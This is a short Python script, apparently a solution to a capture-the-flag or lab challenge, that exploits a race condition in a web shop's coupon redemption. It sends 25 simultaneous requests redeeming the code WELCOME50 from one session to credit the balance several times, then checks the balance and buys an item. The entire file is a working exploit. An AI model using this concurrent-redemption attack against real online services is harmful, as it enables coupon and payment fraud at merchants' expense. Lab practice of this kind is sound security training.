import requests
import threading

BASE_URL = "http://10.21.232.223:48209/"  # fill in from "Start Instance"

session = requests.Session()

# Prime the session/cookie first
session.get(f"{BASE_URL}/")

def redeem():
    try:
        r = session.post(f"{BASE_URL}/api/redeem", json={"code": "WELCOME50"})
        print(r.status_code, r.json())
    except Exception as e:
        print("err", e)

threads = [threading.Thread(target=redeem) for _ in range(25)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Check balance
r = session.get(f"{BASE_URL}/api/balance")
print("Balance:", r.json())


r = session.post(f"{BASE_URL}/api/buy_ramen")
print(r.json())